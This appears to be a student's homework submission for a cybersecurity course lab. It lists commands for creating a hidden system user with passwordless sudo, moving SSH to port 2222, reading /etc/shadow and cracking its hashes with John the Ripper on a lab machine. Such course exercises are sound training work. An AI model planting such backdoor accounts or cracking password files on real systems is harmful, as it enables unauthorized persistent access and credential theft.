Week 6 Homework Submission File: Advanced Bash - Owning the System
Step 1: Shadow People
* Create a secret user named sysd. Make sure this user doesn't have a home folder created:
   * useradd -r sysd
* Give your secret user a password:
   * passwd sysd
* Give your secret user a system UID < 1000:
   * usermod -u 61 sysd
* Give your secret user the same GID:
   * groupmod -g 61 sysd
* Give your secret user full sudo access without the need for a password:
   * visudo 
   * sysd (ALL) NOPASSWD:ALL
* Test that sudo access works without your password:
   * su sysd
   * sudo -l
   * sudo cat /etc/shadow
   * sudo visudo

Step 2: Smooth Sailing
   1. Edit the sshd_config file:
        Port 2222
Step 3: Testing Your Configuration Update
      1. Restart the SSH service:
      * sudo service sshd restart
      2. Exit the root account:
      * exit
      3. SSH to the target machine using your sysd account and port 2222:
      * ssh sysd@192.168.6.105 -p 2222
      4. Use sudo to switch to the root user:
      * sudo -s
Step 4: Crack All the Passwords
      1. SSH back to the system using your sysd account and port 2222:
      * ssh sysd@192.168.6.105 -p 2222
      * sudo -s
      2. Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:
      * sudo cat /etc/shadow | cut -d : -f1-2 >> /root/.john/shadow
      * john shadow
